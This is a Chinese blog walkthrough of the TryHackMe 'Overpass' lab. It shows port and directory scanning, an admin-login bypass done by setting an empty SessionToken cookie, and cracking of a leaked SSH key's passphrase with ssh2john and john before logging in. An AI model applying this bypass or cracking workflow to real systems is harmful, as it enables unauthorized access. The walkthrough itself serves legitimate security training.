<!DOCTYPE html>
<html lang="zh-CN">

<head>
    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="Lucifiel">


    <meta name="subtitle" content="Lucifiel 技术博客">


    <meta name="description" content="Lucifiel 技术博客">


    <meta name="keywords" content="Lucifiel, 路西菲尔, Hackthebox, HTB, 渗透测试, 靶场, 靶机, 黑客, Peneration, OSCP, Vulnhub, Vulhub, HackMe, HackTry, Kali, Hacker">


<title>TryHackMe - Overpass 靶场实战 | Lucifiel&#39;s Blog</title>



    <link rel="icon" href="/favicon.ico">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    
        
    


<meta name="generator" content="Hexo 6.2.0"><!-- hexo-inject:begin --><!-- hexo-inject:end --><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>

<body>
    <!-- hexo-inject:begin --><!-- hexo-inject:end --><script>
        // this function is used to check current theme before page loaded.
        (() => {
            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
            const isDark = currentTheme === 'dark';
            const pagebody = document.getElementsByTagName('body')[0]
            if (isDark) {
                pagebody.classList.add('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
            } else {
                pagebody.classList.remove('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Light"
            }
        })();
    </script>

    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">Lucifiel&#39;s Blog</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>
        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">Lucifiel&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
            <div class="main">
                <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    var tocbot_timer;
    var DEPTH_MAX = 6; // 为 6 时展开所有
    var tocbot_default_config = {
        tocSelector: '.tocbot-list',
        contentSelector: '.post-content',
        headingSelector: 'h1, h2, h3, h4, h5',
        orderedList: false,
        scrollSmooth: true,
        onClick: extend_click,
    };

    function extend_click() {
        clearTimeout(tocbot_timer);
        tocbot_timer = setTimeout(function() {
            tocbot.refresh(obj_merge(tocbot_default_config, {
                hasInnerContainers: true
            }));
        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
    }

    document.ready(function() {
        tocbot.init(obj_merge(tocbot_default_config, {
            collapseDepth: 1
        }));
    });

    function expand_toc() {
        var b = document.querySelector('.tocbot-toc-expand');
        var expanded = b.getAttribute('data-expanded');
        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
        tocbot.refresh(obj_merge(tocbot_default_config, {
            collapseDepth: expanded ? 1 : DEPTH_MAX
        }));
        b.innerText = expanded ? 'Expand all' : 'Collapse all';
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

    function obj_merge(target, source) {
        for (var item in source) {
            if (source.hasOwnProperty(item)) {
                target[item] = source[item];
            }
        }
        return target;
    }
</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">TryHackMe - Overpass 靶场实战</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">Lucifiel</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">五月 5, 2022&nbsp;&nbsp;8:39:12</a>
                        </span>
                    
                    
                </div>
            
        </header>

        <div class="post-content">
            <h1 id="靶场介绍"><a href="#靶场介绍" class="headerlink" title="靶场介绍"></a>靶场介绍</h1><p>当一群破产的计算机科学专业的学生尝试制作密码管理器时会发生什么？显然是一次<em>完美</em>的商业成功！</p>
<p>这个盒子上隐藏着一个 TryHackMe 订阅代码。第一个找到并激活它的人将获得一个月的免费订阅！如果您已经是订阅者，为什么不将代码提供给朋友呢？</p>
<p>更新：该代码现已声明。机器于 2020&#x2F;09&#x2F;25 稍作修改。这只是为了提高机器的性能。它不影响该过程。</p>
<h1 id="靶场地址"><a href="#靶场地址" class="headerlink" title="靶场地址"></a>靶场地址</h1><p><a target="_blank" rel="noopener" href="https://tryhackme.com/room/overpass">https://tryhackme.com/room/overpass</a></p>
<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root💀lucifiel<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
└─<span class="token comment" spellcheck="true"># nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.29.27</span>
Starting Nmap 7.91 <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at 2022-05-05 19:44 CST
Nmap scan report <span class="token keyword">for</span> 10.10.29.27
Host is up <span class="token punctuation">(</span>0.15s latency<span class="token punctuation">)</span>.
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="token punctuation">(</span>Ubuntu Linux<span class="token punctuation">;</span> protocol 2.0<span class="token punctuation">)</span>
<span class="token operator">|</span> ssh-hostkey:
<span class="token operator">|</span>   2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span>
<span class="token operator">|</span>   256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
<span class="token operator">|</span>_  256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
80/tcp <span class="token function">open</span>  http    Golang net/http server <span class="token punctuation">(</span>Go-IPFS json-rpc or InfluxDB API<span class="token punctuation">)</span>
<span class="token operator">|</span>_http-title: Overpass
No exact OS matches <span class="token keyword">for</span> host <span class="token punctuation">(</span>If you know what OS is running on it, see https://nmap.org/submit/ <span class="token punctuation">)</span>.
TCP/IP fingerprint:
OS:SCAN<span class="token punctuation">(</span>V<span class="token operator">=</span>7.91%E<span class="token operator">=</span>4%D<span class="token operator">=</span>5/5%OT<span class="token operator">=</span>22%CT<span class="token operator">=</span>1%CU<span class="token operator">=</span>34521%PV<span class="token operator">=</span>Y%DS<span class="token operator">=</span>2%DC<span class="token operator">=</span>T%G<span class="token operator">=</span>Y%TM<span class="token operator">=</span>6273B8D1
OS:%P<span class="token operator">=</span>x86_64-pc-linux-gnu<span class="token punctuation">)</span>SEQ<span class="token punctuation">(</span>SP<span class="token operator">=</span>105%GCD<span class="token operator">=</span>1%ISR<span class="token operator">=</span>107%TI<span class="token operator">=</span>Z%CI<span class="token operator">=</span>Z%II<span class="token operator">=</span>I%TS<span class="token operator">=</span>A<span class="token punctuation">)</span>OPS<span class="token punctuation">(</span>
OS:O1<span class="token operator">=</span>M506ST11NW7%O2<span class="token operator">=</span>M506ST11NW7%O3<span class="token operator">=</span>M506NNT11NW7%O4<span class="token operator">=</span>M506ST11NW7%O5<span class="token operator">=</span>M506ST11
OS:NW7%O6<span class="token operator">=</span>M506ST11<span class="token punctuation">)</span>WIN<span class="token punctuation">(</span>W1<span class="token operator">=</span>F4B3%W2<span class="token operator">=</span>F4B3%W3<span class="token operator">=</span>F4B3%W4<span class="token operator">=</span>F4B3%W5<span class="token operator">=</span>F4B3%W6<span class="token operator">=</span>F4B3<span class="token punctuation">)</span>ECN<span class="token punctuation">(</span>
OS:R<span class="token operator">=</span>Y%DF<span class="token operator">=</span>Y%T<span class="token operator">=</span>40%W<span class="token operator">=</span>F507%O<span class="token operator">=</span>M506NNSNW7%CC<span class="token operator">=</span>Y%Q<span class="token operator">=</span><span class="token punctuation">)</span>T1<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DF<span class="token operator">=</span>Y%T<span class="token operator">=</span>40%S<span class="token operator">=</span>O%A<span class="token operator">=</span>S+%F<span class="token operator">=</span>AS
OS:%RD<span class="token operator">=</span>0%Q<span class="token operator">=</span><span class="token punctuation">)</span>T2<span class="token punctuation">(</span>R<span class="token operator">=</span>N<span class="token punctuation">)</span>T3<span class="token punctuation">(</span>R<span class="token operator">=</span>N<span class="token punctuation">)</span>T4<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DF<span class="token operator">=</span>Y%T<span class="token operator">=</span>40%W<span class="token operator">=</span>0%S<span class="token operator">=</span>A%A<span class="token operator">=</span>Z%F<span class="token operator">=</span>R%O<span class="token operator">=</span>%RD<span class="token operator">=</span>0%Q<span class="token operator">=</span><span class="token punctuation">)</span>T5<span class="token punctuation">(</span>R<span class="token operator">=</span>
OS:Y%DF<span class="token operator">=</span>Y%T<span class="token operator">=</span>40%W<span class="token operator">=</span>0%S<span class="token operator">=</span>Z%A<span class="token operator">=</span>S+%F<span class="token operator">=</span>AR%O<span class="token operator">=</span>%RD<span class="token operator">=</span>0%Q<span class="token operator">=</span><span class="token punctuation">)</span>T6<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DF<span class="token operator">=</span>Y%T<span class="token operator">=</span>40%W<span class="token operator">=</span>0%S<span class="token operator">=</span>A%A<span class="token operator">=</span>Z%F<span class="token operator">=</span>
OS:R%O<span class="token operator">=</span>%RD<span class="token operator">=</span>0%Q<span class="token operator">=</span><span class="token punctuation">)</span>T7<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DF<span class="token operator">=</span>Y%T<span class="token operator">=</span>40%W<span class="token operator">=</span>0%S<span class="token operator">=</span>Z%A<span class="token operator">=</span>S+%F<span class="token operator">=</span>AR%O<span class="token operator">=</span>%RD<span class="token operator">=</span>0%Q<span class="token operator">=</span><span class="token punctuation">)</span>U1<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DF<span class="token operator">=</span>N%T
OS:<span class="token operator">=</span>40%IPL<span class="token operator">=</span>164%UN<span class="token operator">=</span>0%RIPL<span class="token operator">=</span>G%RID<span class="token operator">=</span>G%RIPCK<span class="token operator">=</span>G%RUCK<span class="token operator">=</span>G%RUD<span class="token operator">=</span>G<span class="token punctuation">)</span>IE<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DFI<span class="token operator">=</span>N%T<span class="token operator">=</span>40%CD<span class="token operator">=</span>
OS:S<span class="token punctuation">)</span>

Network Distance: 2 hops
Service Info: OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel

TRACEROUTE <span class="token punctuation">(</span>using port 1723/tcp<span class="token punctuation">)</span>
HOP RTT       ADDRESS
1   151.63 ms 10.18.0.1
2   152.12 ms 10.10.29.27

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token keyword">.</span>
Nmap done: 1 IP address <span class="token punctuation">(</span>1 host up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> 46.80 seconds
</code></pre>
<h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><img src="/2022/05/05/Overpass/05/05/Overpass/image.png" class>

<p>没什么有用的东西，去 FUZZ 一下</p>
<h2 id="FUZZ"><a href="#FUZZ" class="headerlink" title="FUZZ"></a>FUZZ</h2><pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment" spellcheck="true"># gobuster dir -u http://10.10.29.27/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Gobuster v3.1.0
by OJ Reeves <span class="token punctuation">(</span>@TheColonial<span class="token punctuation">)</span> <span class="token operator">&amp;</span> Christian Mehlmauer <span class="token punctuation">(</span>@firefart<span class="token punctuation">)</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Url:                     http://10.10.29.27/
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Method:                  GET
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Threads:                 10
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Negative Status codes:   404
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> User Agent:              gobuster/3.1.0
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Timeout:                 10s
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
2022/05/05 07:54:43 Starting gobuster <span class="token keyword">in</span> directory enumeration mode
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
/img                  <span class="token punctuation">(</span>Status: 301<span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: 0<span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> img/<span class="token punctuation">]</span>
/downloads            <span class="token punctuation">(</span>Status: 301<span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: 0<span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> downloads/<span class="token punctuation">]</span>
/aboutus              <span class="token punctuation">(</span>Status: 301<span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: 0<span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> aboutus/<span class="token punctuation">]</span>  
/admin                <span class="token punctuation">(</span>Status: 301<span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: 42<span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> /admin/<span class="token punctuation">]</span>  
/css                  <span class="token punctuation">(</span>Status: 301<span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: 0<span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> css/<span class="token punctuation">]</span>
</code></pre>
<p>有一个 &#x2F;admin 目录，进去看一下</p>
<img src="/2022/05/05/Overpass/05/05/Overpass/image1.png" class>

<p>一个登陆页面，使用弱口令没有进去，看一下源代码</p>
<p>在页面 <a target="_blank" rel="noopener" href="http://10.10.29.27/login.js">http://10.10.29.27/login.js</a> 中找到了一句</p>
<pre class=" language-bash"><code class="language-bash">Cookies.set<span class="token punctuation">(</span><span class="token string">"SessionToken"</span>,statusOrCookie<span class="token punctuation">)</span>
</code></pre>
<p>同时在 <a target="_blank" rel="noopener" href="http://10.10.29.27/main.js">http://10.10.29.27/main.js</a> 还有一个内容</p>
<pre class=" language-bash"><code class="language-bash">console.log<span class="token punctuation">(</span><span class="token string">"Hello, World!"</span><span class="token punctuation">)</span>
</code></pre>
<p>这里应该是 Cookie 设置绕过</p>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>按 F12 打开控制台</p>
<img src="/2022/05/05/Overpass/05/05/Overpass/image2.png" class>

<p>这里也确实输出了 “Hello, World”</p>
<p>这里修改我们的 Payload</p>
<pre class=" language-bash"><code class="language-bash">Cookies.set<span class="token punctuation">(</span><span class="token string">"SessionToken"</span>, <span class="token string">""</span><span class="token punctuation">)</span>
</code></pre>
<p>在控制台输入以后，刷新</p>
<img src="/2022/05/05/Overpass/05/05/Overpass/image3.png" class>

<p>直接绕过了登陆机制，拿到了用户 james 的 sshkey</p>
<pre class=" language-bash"><code class="language-bash">-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337

LNu5wQBBz7pKZ3cc4TWlxIUuD/opJi1DVpPa06pwiHHhe8Zjw3/v+xnmtS3O+qiN
JHnLS8oUVR6Smosw4pqLGcP3AwKvrzDWtw2ycO7mNdNszwLp3uto7ENdTIbzvJal
73/eUN9kYF0ua9rZC6mwoI2iG6sdlNL4ZqsYY7rrvDxeCZJkgzQGzkB9wKgw1ljT
WDyy8qncljugOIf8QrHoo30Gv+dAMfipTSR43FGBZ/Hha4jDykUXP0PvuFyTbVdv
BMXmr3xuKkB6I6k/jLjqWcLrhPWS0qRJ718G/u8cqYX3oJmM0Oo3jgoXYXxewGSZ
AL5bLQFhZJNGoZ+N5nHOll1OBl1tmsUIRwYK7wT/9kvUiL3rhkBURhVIbj2qiHxR
3KwmS4Dm4AOtoPTIAmVyaKmCWopf6le1+wzZ/UprNCAgeGTlZKX/joruW7ZJuAUf
ABbRLLwFVPMgahrBp6vRfNECSxztbFmXPoVwvWRQ98Z+p8MiOoReb7Jfusy6GvZk
VfW2gpmkAr8yDQynUukoWexPeDHWiSlg1kRJKrQP7GCupvW/r/Yc1RmNTfzT5eeR
OkUOTMqmd3Lj07yELyavlBHrz5FJvzPM3rimRwEsl8GH111D4L5rAKVcusdFcg8P
9BQukWbzVZHbaQtAGVGy0FKJv1WhA+pjTLqwU+c15WF7ENb3Dm5qdUoSSlPzRjze
eaPG5O4U9Fq0ZaYPkMlyJCzRVp43De4KKkyO5FQ+xSxce3FW0b63+8REgYirOGcZ
4TBApY+uz34JXe8jElhrKV9xw/7zG2LokKMnljG2YFIApr99nZFVZs1XOFCCkcM8
GFheoT4yFwrXhU1fjQjW/cR0kbhOv7RfV5x7L36x3ZuCfBdlWkt/h2M5nowjcbYn
exxOuOdqdazTjrXOyRNyOtYF9WPLhLRHapBAkXzvNSOERB3TJca8ydbKsyasdCGy
AIPX52bioBlDhg8DmPApR1C1zRYwT1LEFKt7KKAaogbw3G5raSzB54MQpX6WL+wk
6p7/wOX6WMo1MlkF95M3C7dxPFEspLHfpBxf2qys9MqBsd0rLkXoYR6gpbGbAW58
dPm51MekHD+WeP8oTYGI4PVCS/WF+U90Gty0UmgyI9qfxMVIu1BcmJhzh8gdtT0i
n0Lz5pKY+rLxdUaAA9KVwFsdiXnXjHEE1UwnDqqrvgBuvX6Nux+hfgXi9Bsy68qT
8HiUKTEsukcv/IYHK1s+Uw/H5AWtJsFmWQs3bw+Y4iw+YLZomXA4E7yxPXyfWm4K
4FMg3ng0e4/7HRYJSaXLQOKeNwcf/LW5dipO7DmBjVLsC8eyJ8ujeutP/GcA5l6z
ylqilOgj4+yiS813kNTjCJOwKRsXg2jKbnRa8b7dSRz7aDZVLpJnEy9bhn6a7WtS
49TxToi53ZB14+ougkL4svJyYYIRuQjrUmierXAdmbYF9wimhmLfelrMcofOHRW2
+hL1kHlTtJZU8Zj2Y2Y3hd6yRNJcIgCDrmLbn9C5M0d7g0h2BlFaJIZOYDS6J6Yk
2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7
-----END RSA PRIVATE KEY-----
</code></pre>
<p>将 sshkey 保存到 id_rsa 中，并给予权限</p>
<pre class=" language-bash"><code class="language-bash"><span class="token function">chmod</span> 600 id_rsa
</code></pre>
<p>接着使用 ssh 进行登陆</p>
<pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root💀lucifiel<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment" spellcheck="true"># ssh james@10.10.84.23 -i id_rsa</span>
The authenticity of host <span class="token string">'10.10.84.23 (10.10.84.23)'</span> can<span class="token string">'t be established.
ECDSA key fingerprint is SHA256:4P0PNh/u8bKjshfc6DBYwWnjk1Txh5laY/WbVPrCUdY.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span>10.10.84.23<span class="token string">' (ECDSA) to the list of known hosts.
Enter passphrase for key '</span>id_rsa':
</code></pre>
<p>显示需要输入密码，去破解一下</p>
<pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root💀lucifiel<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment" spellcheck="true"># ssh2john id_rsa > hash</span>

┌──<span class="token punctuation">(</span>root💀lucifiel<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment" spellcheck="true"># cat hash</span>
id_rsa:<span class="token variable">$sshng</span><span class="token variable">$1</span><span class="token variable">$16</span><span class="token variable">$9F85D92F34F42626F13A7493AB48F337</span><span class="token variable">$1200</span><span class="token variable">$2cdbb9c10041cfba4a67771ce135a5c4852e0ffa29262d435693dad3aa708871e17bc663c37feffb19e6b52dcefaa88d2479cb4bca14551e929a8b30e29a8b19c3f70302afaf30d6b70db270eee635d36ccf02e9deeb68ec435d4c86f3bc96a5ef7fde50df64605d2e6bdad90ba9b0a08da21bab1d94d2f866ab1863baebbc3c5e099264833406ce407dc0a830d658d3583cb2f2a9dc963ba03887fc42b1e8a37d06bfe74031f8a94d2478dc518167f1e16b88c3ca45173f43efb85c936d576f04c5e6af7c6e2a407a23a93f8cb8ea59c2eb84f592d2a449ef5f06feef1ca985f7a0998cd0ea378e0a17617c5ec0649900be5b2d0161649346a19f8de671ce965d4e065d6d9ac50847060aef04fff64bd488bdeb8640544615486e3daa887c51dcac264b80e6e003ada0f4c802657268a9825a8a5fea57b5fb0cd9fd4a6b3420207864e564a5ff8e8aee5bb649b8051f0016d12cbc0554f3206a1ac1a7abd17cd1024b1ced6c59973e8570bd6450f7c67ea7c3223a845e6fb25fbaccba1af66455f5b68299a402bf320d0ca752e92859ec4f7831d6892960d644492ab40fec60aea6f5bfaff61cd5198d4dfcd3e5e7913a450e4ccaa67772e3d3bc842f26af9411ebcf9149bf33ccdeb8a647012c97c187d75d43e0be6b00a55cbac745720f0ff4142e9166f35591db690b401951b2d05289bf55a103ea634cbab053e735e5617b10d6f70e6e6a754a124a53f3463cde79a3c6e4ee14f45ab465a60f90c972242cd1569e370dee0a2a4c8ee4543ec52c5c7b7156d1beb7fbc4448188ab386719e13040a58faecf7e095def2312586b295f71c3fef31b62e890a3279631b6605200a6bf7d9d915566cd5738508291c33c18585ea13e32170ad7854d5f8d08d6fdc47491b84ebfb45f579c7b2f7eb1dd9b827c17655a4b7f8763399e8c2371b6277b1c4eb8e76a75acd38eb5cec913723ad605f563cb84b4476a9040917cef352384441dd325c6bcc9d6cab326ac7421b20083d7e766e2a01943860f0398f0294750b5cd16304f52c414ab7b28a01aa206f0dc6e6b692cc1e78310a57e962fec24ea9effc0e5fa58ca35325905f793370bb7713c512ca4b1dfa41c5fdaacacf4ca81b1dd2b2e45e8611ea0a5b19b016e7c74f9b9d4c7a41c3f9678ff284d8188e0f5424bf585f94f741adcb452683223da9fc4c548bb505c98987387c81db53d229f42f3e69298fab2f175468003d295c05b1d8979d78c7104d54c270eaaabbe006ebd7e8dbb1fa17e05e2f41b32ebca93f0789429312cba472ffc86072b5b3e530fc7e405ad26c166590b376f0f98e22c3e60b66899703813bcb13d7c9f5a6e0ae05320de78347b8ffb1d160949a5cb40e29e37071ffcb5b9762a4eec39818d52ec0bc7b227cba37aeb4ffc6700e65eb3ca5aa294e823e3eca24bcd7790d4e30893b0291b178368ca6e745af1bedd491cfb6836552e9267132f5b867e9aed6b52e3d4f14e88b9dd9075e3ea2e8242f8b2f272618211b908eb52689ead701d99b605f708a68662df7a5acc7287ce1d15b6fa12f5907953b49654f198f663663785deb244d25c220083ae62db9fd0b933477b83487606515a24864e6034ba27a624d9c5a4fcc967efe3a1000a40bc304a54ceff2c647dfec54f71e128b3a1d37c15db9ac895f9ea05cd4b6e8edca6bfc53b</span>
</code></pre>
<p>然后使用 john 进行爆破</p>
<pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root💀lucifiel<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment" spellcheck="true"># john --wordlist=/usr/share/wordlists/rockyou.txt hash                                                                            1 ⨯</span>
Using default input encoding: UTF-8
Loaded 1 password <span class="token function">hash</span> <span class="token punctuation">(</span>SSH, SSH private key <span class="token punctuation">[</span>RSA/DSA/EC/OPENSSH 32/64<span class="token punctuation">]</span><span class="token punctuation">)</span>
Cost 1 <span class="token punctuation">(</span>KDF/cipher <span class="token punctuation">[</span>0<span class="token operator">=</span>MD5/AES 1<span class="token operator">=</span>MD5/3DES 2<span class="token operator">=</span>Bcrypt/AES<span class="token punctuation">]</span><span class="token punctuation">)</span> is 0 <span class="token keyword">for</span> all loaded hashes
Cost 2 <span class="token punctuation">(</span>iteration count<span class="token punctuation">)</span> is 1 <span class="token keyword">for</span> all loaded hashes
Will run 2 OpenMP threads
Press <span class="token string">'q'</span> or Ctrl-C to abort, almost any other key <span class="token keyword">for</span> status
james13          <span class="token punctuation">(</span>id_rsa<span class="token punctuation">)</span>
1g 0:00:00:00 DONE <span class="token punctuation">(</span>2022-05-05 20:27<span class="token punctuation">)</span> 12.50g/s 167200p/s 167200c/s 167200C/s lisa<span class="token punctuation">..</span>honolulu
Use the <span class="token string">"--show"</span> option to display all of the cracked passwords reliably
Session completed.
</code></pre>
<p>这里爆破出来了密码为 james13 去就进行连接</p>
<pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root💀lucifiel<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment" spellcheck="true"># ssh james@10.10.84.23 -i id_rsa</span>
Enter passphrase <span class="token keyword">for</span> key <span class="token string">'id_rsa'</span><span class="token keyword">:</span>
Welcome to Ubuntu 18.04.4 LTS <span class="token punctuation">(</span>GNU/Linux 4.15.0-108-generic x86_64<span class="token punctuation">)</span>

 * Documentation:  https://help.ubuntu.com
